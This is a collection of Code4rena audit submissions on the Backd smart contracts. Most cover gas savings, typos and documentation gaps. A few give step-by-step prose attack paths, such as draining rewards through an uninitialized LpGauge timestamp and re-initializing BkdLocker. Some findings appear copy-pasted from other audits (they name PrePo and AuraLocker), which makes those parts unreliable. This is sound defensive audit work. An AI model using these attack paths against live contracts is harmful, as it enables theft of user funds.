## G01 - Comparison ```> 0``` is less gas efficient than ```!= 0``` with ```uint256``` in ```require``` statement with optimizer  ```solidity protocol/contracts/BkdLocker.sol:91 require(amount > 0, Error.INVALID_AMOUNT); protocol/contracts/BkdLocker.sol:92 require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS);  protocol/contracts/BkdLocker.sol:137    require(length > 0, "No entries"); protocol/contracts/tokenomics/AmmGauge.sol:104  require(amount > 0, Error.INVALID_AMOUNT);  protocol/contracts/tokenomics/AmmGauge.sol:125  require(amount > 0, Error.INVALID_AMOUNT);  protocol/contracts/tokenomics/KeeperGauge.sol:140   require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); protocol/contracts/tokenomics/VestedEscrow.sol:84   require(unallocatedSupply > 0, "No reward tokens in contract");  ```  ## G02 - Too long revert string  Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition has been met.  ```solidity protocol/contracts/tokenomics/Minter.sol:152    "Maximum non-inflation amount exceeded."  ``` https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L152  ## G03 - ```unchecked``` block can be used for gas efficiency of the expression that can't overflow/underflow  Check comments ```soldity  protocol/contracts/utils/CvxMintAmount.sol:21   uint256 currentCliff = cvxTotalSupply / _CLIFF_SIZE; // Could be unchecked since _CLIFF_SIZE is non-zero constant  protocol/contracts/zaps/PoolMigrationZap.sol:22 for (uint256 i; i < newPools_.length; ++i) { // Increment in for loop can be unchecked, it would never overflow with type uint256 protocol/contracts/tokenomics/VestedEscrow.sol:155  uint256 elapsed = _time - startTime; // Could be unchecked due to check on L152 protocol/contracts/BkdLocker.sol:140    i = i - 1; // Could be unchecked due to check on L139 protocol/contracts/BkdLocker.sol:144    stashedWithdraws[i] = stashedWithdraws[stashedWithdraws.length - 1]; //  Could be unchecked since length of stashedWithdraws decrease in sync with counter "i" and loop will end after length 1 ```  ## G04 - Caching storage values in memory  Variables that are read multiple times in a code block can be cached and re-used instead of reading from storage to save gas.  ```solidity protocol/contracts/StakerVault.sol:338  uint256 staked = IERC20(token).balanceOf(address(this)) - oldBal; // token 5 SLOADs ``` https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L322-L349 ```solidity protocol/contracts/StakerVault.sol:383  uint256 unstaked = oldBal.uncheckedSub(IERC20(token).balanceOf(address(this))); // token 4 SLOADs ``` https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L359-L398  ## G05 - Redundant code  The following lines don't change the value of the variable since it's uint256: ```solidity protocol/contracts/tokenomics/InflationManager.sol:575  totalKeeperPoolWeight = totalKeeperPoolWeight > 0 ? totalKeeperPoolWeight : 0;  protocol/contracts/tokenomics/InflationManager.sol:589  totalLpPoolWeight = totalLpPoolWeight > 0 ? totalLpPoolWeight : 0;  protocol/contracts/tokenomics/InflationManager.sol:602  totalAmmTokenWeight = totalAmmTokenWeight > 0 ? totalAmmTokenWeight : 0; ``` https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L575 
 ## N01 - Typos  ``` protocol/contracts/BkdLocker.sol:173   * @dev This does not invlude the gov. tokens queued for withdrawal. // typo - include protocol/contracts/tokenomics/FeeBurner.sol:29  event Burned(address targetLpToken, uint256 amountBurned); // Emmited after a successfull burn to target lp token //  typo - successful protocol/contracts/tokenomics/FeeBurner.sol:84  // Transfering LP tokens back to sender // typo -Transferring ```  ## N02 - Open TODO  ```solidity protocol/contracts/tokenomics/InflationManager.sol:532  //TOOD: See if this is still needed somewhere ```  ## N03 - More readable numbers  Numbers like 100000000 could be set 100_000_000 for more readability:  ```solidity     uint256 private constant _CLIFF_SIZE = 100000 * 1e18; //new cliff every 100,000 tokens      uint256 private constant _CLIFF_COUNT = 1000; // 1,000 cliffs     uint256 private constant _MAX_SUPPLY = 100000000 * 1e18; //100 mil max supply      ``` 
### FINDINGS ### TYPOS  File: BkdLocker.sol [line 732](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L173) ``` * @dev This does not invlude the gov. tokens queued for withdrawal. ``` **invlude** Instead of **include**  File: FeeBurner.sol [line 35](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L35) ``` receive() external payable {} // Recieve function for withdrawing from Backd ETH Pool ``` **Recieve** instead of **Receive**  File:AddressProvider.sol  [line 237](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L237) ```  * @param key Key to feeze   ``` **feeze** Instead of **freeze**   ### NATSPEC is Incomplete  File: AddressProvider.sol [line 77-87 ](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L77-L87) ```    /**      * @notice Adds action.      * @param action Address of action to add.      */     function addAction(address action) external override onlyGovernance returns (bool) {         bool result = _actions.add(action);         if (result) {             emit ActionListed(action);         }         return result;     } ``` Missing @return    File:AddressProvider.sol [line 172-178](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L172-L178) ```     /**      * @notice Returns the address for the given key      */     function getAddress(bytes32 key) public view override returns (address) {         require(_addressKeyMetas.contains(key), Error.ADDRESS_DOES_NOT_EXIST);         return currentAddresses[key];     } ``` Missing @param key   File:AddressProvider.sol [line 180-187](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L180-L187) ```     /**      * @notice Returns the address for the given key      * @dev if `checkExists` is true, it will fail if the key does not exist      */     function getAddress(bytes32 key, bool checkExists) public view override returns (address) {         require(!checkExists || _addressKeyMetas.contains(key), Error.ADDRESS_DOES_NOT_EXIST);         return currentAddresses[key];     } ``` Missing @param key   File:AddressProvider.sol  [line 264-268](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L264-L268) ```    /**      * @notice Execute update of `key`      * @return New address.      */     function executeAddress(bytes32 key) external override returns (address) { ``` Missing @param key   File:AddressProvider.sol [line 365-369](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L365-L369) ```    /**      * @notice returns the pool at the given index      */     function getPoolAtIndex(uint256 index) external view override returns (address) {         return _tokenToPools.valueAt(index); ``` Missing @param index   File: StakerVault.sol [line 93-98](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L93-L98) ```    /**      * @notice Registers an address as a strategy to be excluded from token accumulation.      * @dev This should be used if a strategy deposits into a stakerVault and should not get gov. tokens.      * @return `true` if success.      */     function addStrategy(address strategy) external override returns (bool) { ``` Missing @param strategy    ### Inconsistent use/impementation of the uncheck block   Throught the contracts  a library is being used to handle the arithmetic operations that can never over/underflow. The library **UncheckedMath.sol** has been used in all for loops to wrap the the loop increment  using the function **uncheckedInc()** as shown below  File: StakerVault.sol [line 256-263](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L256-L263) ```     function getStakedByActions() external view override returns (uint256) {         address[] memory actions = addressProvider.allActions();         uint256 total;         for (uint256 i; i < actions.length; i = i.uncheckedInc()) {             total += balances[actions[i]];         }         return total;     } ```  The above usage of the library **UncheckedMath.sol** and the **uncheckedInc()** function has been implemented in all contracts apart from the following.   File:PoolMigrationZap.sol  [line 38-45](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L38-L45) ```    function migrateAll(address[] calldata oldPoolAddresses_) external override {         for (uint256 i; i < oldPoolAddresses_.length; ) {             migrate(oldPoolAddresses_[i]);             unchecked {                 ++i;             }         }     } ```  The above uses the unchecked{} block directly rather than follow the same pattern with other contracts.  I would suggest we stick to the same approach in handling the arithmetics that can never over/underflow.
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L115-L119 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L326-L328   # Vulnerability details  ## Impact A user can claim all of the available governance tokens or prevent any rewards from being claimed in `LpGauge.sol` if sufficient time is left between deploying the contract and initialising it in the `StakerVault.sol` contract by calling `initalizeLPGauge()` OR if a new `LPGauge` contract is deployed and added to `StakerVault` using `prepareLPGauge`.  Inside `LPGauge.sol` when calling `_poolCheckPoint()`, the `lastUpdated` variable is not initalised so defaults to a value of `0`, therefore if the user has managed to stake tokens in the `StakerVault` then the calculated `poolStakedIntegral` will be very large (as block.timestamp is very large). Therefore a user can mint most current available governance tokens for themselves when they claim their rewards (or prevent any governance tokens from being claimed).  ## Proof of Concept 1. LP Gauge and StakerVault contracts are deployed 2. Before the `initializeLpGauge()`, user A will stake 1 token with `stakeFor()` thereby increasing `_poolTotalStaked` by 1. As the `lpgauge` address is equal to the zero address, `_userCheckPoint()` will not be called and `poolLastUpdate` will remain at 0. 3. The user can then directly call `_userCheckPoint()` and be allocated a very large number of shares. This works because `poolLastUpdate` is 0 but the staked amount in the vault is larger than 0 4. Once `initializeLPGauge()` is called, the user can then call `claimRewards()` and receive a very large portion of tokens or if `poolStakedIntegral` exceeds the mint limit set by `Minter.sol` then no one else can claim governance tokens from the lpGauge.  OR 5. A new LP Gauge contract is deployed and added to the vault using `prepareGauge()`. Follow steps 2 to 4.  ## Tools Used Manual audit ## Recommended Mitigation Steps Initialise `poolLastUpdate` in the constructor  
## FINDINGS  ## Comparisons: != is more efficient than > in require  != 0 costs less gas compared to > 0 for unsigned integers in require statements with the optimizer enabled (6 gas)  Proof: While it may seem that > 0 is cheaper than !=, this is only true without the optimizer enabled and outside a require statement. If you enable the optimizer at 10k AND you're in a require statement, this will save gas. You can see this [tweet](https://twitter.com/gzeon/status/1485428085885640706) for more proofs:   I suggest changing > 0 with != 0 here:  File: BkdLocker.sol [line 91](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L91) ``` require(amount > 0, Error.INVALID_AMOUNT); ``` Since **amount** is a uint256, it means it's value can never be less than 0 so the test > 0 is essentially testing that amount is not equal to 0 a  **Other Instances** File: BkdLocker.sol [line 92](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L92) ``` require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS); ```   File: BkdLocker.sol [line 137](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L137) ``` require(length > 0, "No entries"); ```  File: VestedEscrow.sol [line 84](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L84) ``` require(unallocatedSupply > 0, "No reward tokens in contract"); ``` File: AmmGauge.sol [line 104](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L104) ``` require(amount > 0, Error.INVALID_AMOUNT); ``` File: AmmGauge.sol [line 125](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L125) ```         require(amount > 0, Error.INVALID_AMOUNT); ```  ## use shorter revert strings(less than 32 bytes) or use custom errors  File: Minter.sol [line 150](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L150)  ```require(             issuedNonInflationSupply + amount <= nonInflationDistribution,             "Maximum non-inflation amount exceeded."         ); ```  ## Cache the length of arrays in loops Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack. Caching the array length in the stack saves around 3 gas per iteration. Therefore, it’s possible to save a significant amount of gas  especially when the length is significantly big.  Here, I suggest storing the array’s length in a variable before the for-loop, and use it instead:   File:StakerVault.sol [line 259](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L259)   ``` function getStakedByActions() external view override returns (uint256) {         address[] memory actions = addressProvider.allActions();         uint256 total;         for (uint256 i; i < actions.length; i = i.uncheckedInc()) {             total += balances[actions[i]];         }         return total;     } ``` The line to modify:  ``` for (uint256 i; i < actions.length; i = i.uncheckedInc()) { ```   **Other Instance to change** File: RewardHandler.sol [line 35-55](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L35-L55)  ```    function burnFees() external override {         IBkdLocker bkdLocker = IBkdLocker(addressProvider.getBKDLocker());         IFeeBurner feeBurner = addressProvider.getFeeBurner();         address targetLpToken = bkdLocker.rewardToken();         address[] memory pools = addressProvider.allPools();         uint256 ethBalance = address(this).balance;         address[] memory tokens = new address[](pools.length);         for (uint256 i; i < pools.length; i = i.uncheckedInc()) {             ILiquidityPool pool = ILiquidityPool(pools[i]);             address underlying = pool.getUnderlying();             if (underlying != address(0)) {                 _approve(underlying, address(feeBurner));             }             tokens[i] = underlying;         }         feeBurner.burnToTarget{value: ethBalance}(tokens, targetLpToken);         uint256 burnedAmount = IERC20(targetLpToken).balanceOf(address(this));         IERC20(targetLpToken).safeApprove(address(bkdLocker), burnedAmount);         bkdLocker.depositFees(burnedAmount);         emit Burned(targetLpToken, burnedAmount);     } ``` The specific line to change [here](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L42) ```        for (uint256 i; i < pools.length; i = i.uncheckedInc()) { ```   File: PoolMigrationZap.sol [line 22](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L22) ```         for (uint256 i; i < newPools_.length; ++i) { ```   Something similar to my propasal **was implemented on this contract as shown in the function below.** File:Controller.sol [line 121-130](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L121-L130) ```    function getTotalEthRequiredForGas(address payer) external view override returns (uint256) {         // solhint-disable-previous-line ordering         uint256 totalEthRequired;         address[] memory actions = addressProvider.allActions();         uint256 numActions = actions.length;         for (uint256 i; i < numActions; i = i.uncheckedInc()) {             totalEthRequired += IAction(actions[i]).getEthRequiredForGas(payer);         }         return totalEthRequired;     } ``` Note the array length was cached to **numActions**   **Also Implemented on here:** File:InflationManager.sol [line 96-100](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L96-L100) ```address[] memory liquidityPools = addressProvider.allPools();         uint256 length = liquidityPools.length;         for (uint256 i; i < length; i = i.uncheckedInc()) {             _removeKeeperGauge(address(liquidityPools[i]));         } ```  ### Using unchecked blocks to save gas Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn't possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an unchecked block: [see official docs](https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic)  File: VestedEscrow.sol [line 63](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L63) ```         totalTime = endtime_ - starttime_; ``` The above line cannot overflow due to the check on the line shown below File: VestedEscrow.sol [line 58](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L58) ```         require(endtime_ > starttime_, "end must be greater"); ``` In this contract we have a library that can aid in having unchecked arithmetics that is **libraries/UncheckedMath.sol** imported on  [line 21](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L21)  With the help of this library we can modify our arithmetic to   ```         totalTime = endtime_.uncheckedSub(starttime_); ``` A similar approach was implemented in the file below. File: StakerVault.sol [lines 229-230](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L229-L230)  ```         if (actionLockedBalances[account] > amount) {             actionLockedBalances[account] = actionLockedBalances[account].uncheckedSub(amount); ```   **Other Instances to modify** File:  VestedEscrow.sol [line 155](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L155) ```         uint256 elapsed = _time - startTime; ``` The above cannot underflow due to the check on [line 152](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L152) which ensures that time is greater than startTime ```         if (_time < startTime) {             return 0;         }         uint256 elapsed = _time - startTime;         return Math.min((locked * elapsed) / totalTime, locked); ```  This  ```uint256 elapsed = _time - startTime;```  should be changed to  ```uint256 elapsed = _time.uncheckedSub(startTime);```    File: StakerVault.sol  [line 124](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L124)  ```         balances[msg.sender] -= amount; ```  The above line cannot underflow due the check on [line 113](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L113) ```         require(balances[msg.sender] >= amount, Error.INSUFFICIENT_BALANCE); ``` The checks ensures that **balances[msg.sender]** is greater or equal to **amount** therefore balances[msg.sender]-amount will never underflow.   
## Caching  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/access/RoleManager.sol#L82 cache the value of `roles.length` before starting the loop to save gas  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L144 Use variable `length` instead of `stashedWithdraws.length` to save 1 SLOAD  ## !=0 is cheaper than >0 inside require staements https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L91 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L92 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L137 
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L53-L64   # Vulnerability details  ## Impact function `initialize()` of `BkdLocker` suppose to be called one time and contract initialize one time. but if it's called by `startBoost=0` then it's possible to call it again with different values for other parameters. there are some logics based on the values function `initilize()` sets which is in calculating boost and withdraw delay. by initializing multiple times different users get different values for those logics and because rewards are distributed based on boosts so those logics will be wrong too.  ## Proof of Concept This is `initiliaze()` code in `BkdLocker`: ```     function initialize(         uint256 startBoost,         uint256 maxBoost,         uint256 increasePeriod,         uint256 withdrawDelay     ) external override onlyGovernance {         require(currentUInts256[_START_BOOST] == 0, Error.CONTRACT_INITIALIZED);         _setConfig(_START_BOOST, startBoost);         _setConfig(_MAX_BOOST, maxBoost);         _setConfig(_INCREASE_PERIOD, increasePeriod);         _setConfig(_WITHDRAW_DELAY, withdrawDelay);     } ``` As you can see it checks the initialization statue by `currentUInts256[_START_BOOST]`'s value but it's not correct way to do and initializer can set `currentUInts256[_START_BOOST]` value as `0` and set other parameters values and call this function multiple times with different values for `_MAX_BOOST` and `_INCREASE_PERIOD` and `_WITHDRAW_DELAY`. setting different values for those parameters can cause different calculation in `computeNewBoost()` and `prepareUnlock()`. function `computeNewBoost()` is used to calculate users boost parameters which is used on reward distribution. so by changing `_MAX_BOOST` the rewards will be distributed wrongly between old users and new users.  ## Tools Used VIM  ## Recommended Mitigation Steps add some other variable to check the status of initialization of contract.   
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L62-L76   # Vulnerability details  ## Impact Unclaimed fees from pool will be stuck  ## Proof of Concept When delisting a pool the pool's reference is removed from address provider:  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L63  Burning fees calls a dynamic list of all pools which no longer contains the delisted pool:  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L39  Since the list no longer contains the pool those fees will not be processed and will remain stuck in the contract   ## Tools Used  ## Recommended Mitigation Steps Call burnFees() before delisting a pool  
# ISSUE LIST  ## C4-001 : Missing events for only functions that change critical parameters - Non Critical ## C4-002 : Critical changes should use two-step procedure - Non Critical ## C4-003 : Missing zero-address/values check in the constructor - Low ## C4-004 : The Contract Should approve(0) first ## C4-005 : Incompatibility With Rebasing/Deflationary/Inflationary tokens ## C4-006 : Contract should have pause/unpause functionality ## C4-007 : Front-runnable Initializers     # ISSUES  # C4-001 : Missing events for only functions that change critical parameters  ## Impact - Non critical  The afunctions that change critical parameters should emit events. Events allow capturing the changed parameters so that off-chain tools/interfaces can register such changes with timelocks that allow users to evaluate them and consider if they would like to engage/exit based on how they perceive the changes as affecting the trustworthiness of the protocol or profitability of the implemented financial services. The alternative of directly querying on-chain contract state for such changes is not considered practical for most users/usages.  Missing events and timelocks do not promote transparency and if such changes immediately affect users’ perception of fairness or trustworthiness, they could exit the protocol causing a reduction in liquidity which could negatively impact protocol TVL and reputation.   ## Proof of Concept  1. Navigate to the following contract.  ``` https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L86 ```  See similar High-severity H03 finding OpenZeppelin’s Audit of Audius (https://blog.openzeppelin.com/audius-contracts-audit/#high) and Medium-severity M01 finding OpenZeppelin’s Audit of UMA Phase 4 (https://blog.openzeppelin.com/uma-audit-phase-4/)  ## Tools Used  None  ## Recommended Mitigation Steps  Add events to all functions that change critical parameters.   # C4-002 : Critical changes should use two-step procedure  ## Impact - NON CRITICAL  The critical procedures should be two step process.  ## Proof of Concept  1. Navigate to the following contract.  ``` https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L86 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/access/RoleManager.sol#L50 ```  ## Tools Used  Code Review  ## Recommended Mitigation Steps  Lack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.  # C4-003 : # Missing zero-address&values check in the constructor  ## Impact  Missing checks for zero-addresses&values may lead to infunctional protocol, if the variable addresses are updated incorrectly.  ## Proof of Concept  There are a few validations that could be added to the system:  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/LpGauge.sol#L33  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L55  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L51  ## Tools Used  Code Review  ## Recommended Mitigation Steps  Consider adding zero-address and zero value checks.  # C4-004 : The Contract Should approve(0) first  ## Impact  - LOW  Some tokens (like USDT L199) do not work when changing the allowance from an existing non-zero allowance value. They must first be approved by zero and then the actual allowance must be approved.  ``` IERC20(token).safeApprove(address(operator), 0); IERC20(token).safeApprove(address(operator), amount); ```  ## Proof of Concept  1. Navigate to the following contracts.  ```   protocol/contracts/tokenomics/AmmConvexGauge.sol::61 => IERC20(ammToken).safeApprove(booster, type(uint256).max);   protocol/contracts/tokenomics/FeeBurner.sol::118 => IERC20(token_).safeApprove(spender_, type(uint256).max);  ```  2.  When trying to re-approve an already approved token, all transactions revert and the protocol cannot be used.  ## Tools Used  None  ## Recommended Mitigation Steps  Approve with a zero amount first before setting the actual amount. Consider use safeIncreaseAllowance and safeDecreaseAllowance.   # C4-005 : Incompatibility With Rebasing/Deflationary/Inflationary tokens  ## Impact -  LOW  PrePo protocol do not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.  ## Proof of Concept  1. Navigate to the following contract.  ``` protocol/contracts/tokenomics/VestedEscrowRevocable.sol:10:- remove safeTransferFrom logic and add support for "airdropped" reward token protocol/contracts/tokenomics/VestedEscrowRevocable.sol:60:        rewardToken.safeTransferFrom( protocol/contracts/tokenomics/AmmConvexGauge.sol:162:        IERC20(ammToken).safeTransferFrom(msg.sender, address(this), amount); protocol/contracts/tokenomics/FeeBurner.sol:70:            token_.safeTransferFrom(msg.sender, address(this), tokenBalance_); protocol/contracts/tokenomics/VestedEscrow.sol:10:- remove safeTransferFrom logic and add support for "airdropped" reward token protocol/contracts/tokenomics/VestedEscrow.sol:146:        rewardToken.safeTransferFrom(holdingContract[msg.sender], _recipient, claimable); protocol/contracts/tokenomics/AmmGauge.sol:109:        IERC20(ammToken).safeTransferFrom(msg.sender, address(this), amount); ```  ## Tools Used  Manual Code Review  ## Recommended Mitigation Steps  - Ensure that to check previous balance/after balance  equals to amount for any rebasing/inflation/deflation - Add support in contracts for such tokens before accepting user-supplied tokens - Consider supporting deflationary / rebasing / etc tokens by extra checking the balances before/after or strictly inform your users not to use such tokens if they don't want to lose them.   # C4-006 : Contract should have pause/unpause functionality  ## Impact  In case a hack is occuring or an exploit is discovered, the team should be able to pause functionality until the necessary changes are made to the system. Additionally, the AuraLocker.sol contract should be manged by proxy so that upgrades can be made by the owner.  To use a thorchain example again, the team behind thorchain noticed an attack was going to occur well before the system transferred funds to the hacker. However, they were not able to shut the system down fast enough. (According to the incidence report here: https://github.com/HalbornSecurity/PublicReports/blob/master/Incident%20Reports/Thorchain_Incident_Analysis_July_23_2021.pdf)   ## Proof of Concept  https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L249   ## Tools Used  Code Review  ## Recommended Mitigation Steps  Pause functionality on the contract would have helped secure the funds quickly.   # C4-007 : Front-runnable Initializers  ## Impact - LOW  All contract **initializers** were missing access controls, allowing any user to initialize the contract. By front-running the contract deployers to initialize the contract, the incorrect parameters may be supplied, leaving the contract needing to be redeployed.   ## Proof of Concept  1. Navigate to the following contracts.  ``` protocol/contracts/BkdLocker.sol:53:    function initialize( protocol/contracts/LpToken.sol:28:    function initialize( protocol/contracts/StakerVault.sol:71:    function initialize(address _token) external override initializer {  ```  2. initialize functions does not have access control. They are vulnerable to front-running.  ## Tools Used  Manual Code Review  ## Recommended Mitigation Steps  While the code that can be run in contract constructors is limited, setting the owner in the contract's constructor to the `msg.sender` and adding the `onlyOwner` modifier to all **initializers** would be a sufficient level of access control. 
### [G-01] Unnecessary check for positive value  #### Description  A `uint256` value can not be negative, hence there is no need to check for it.  #### Findings  [tokenomics/InflationManager.sol#L589](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L589)  ```solidity totalLpPoolWeight = totalLpPoolWeight > 0 ? totalLpPoolWeight : 0; ```  [tokenomics/InflationManager.sol#L602](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L602)  ```solidity totalAmmTokenWeight = totalAmmTokenWeight > 0 ? totalAmmTokenWeight : 0; ```  [tokenomics/InflationManager.sol#L575](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L575)  ```solidity totalKeeperPoolWeight = totalKeeperPoolWeight > 0 ? totalKeeperPoolWeight : 0; ```  #### Recommended mitigation steps  Remove the check and use the value directly to save gas.  ### [G-02] Unnecessary `poolCheckpoint` function call  The `AmmGauge` and `KeeperGauge` contracts call the function `poolCheckpoint()` within the `kill()` function. Therefore, functions which call this `kill()` function do not have to additionally call the `poolCheckpoint()` function.  #### Description  A `uint256` value can not be negative, hence there is no need to check for it.  #### Findings  [tokenomics/InflationManager.sol#L427](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L427)\ [tokenomics/InflationManager.sol#L461](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L461)  #### Recommended mitigation steps  Remove the call to `poolCheckpoint()` to save gas. 
#1 Immutable  Impact the state can't be initialize  by constructor.  Proof Of Concept  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L35  Tool Used Manual Review  Recommended Mitigation Steps the state must add immutable because in the constructor parameter mention fundAdmin to initialize. so i suggest to add immutable on it.      address public fundAdmin; to      address public immutable fundAdmin;  #2 Typo  Impact missleading  Proof of Concept https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L173  Tools Used manual review  Recommended Mitigation Steps fix the typo to increase readibility. fix it from        * @dev This does not invlude the gov. tokens queued for withdrawal. to       * @dev This does not includes the gov. tokens queued for withdrawal. 
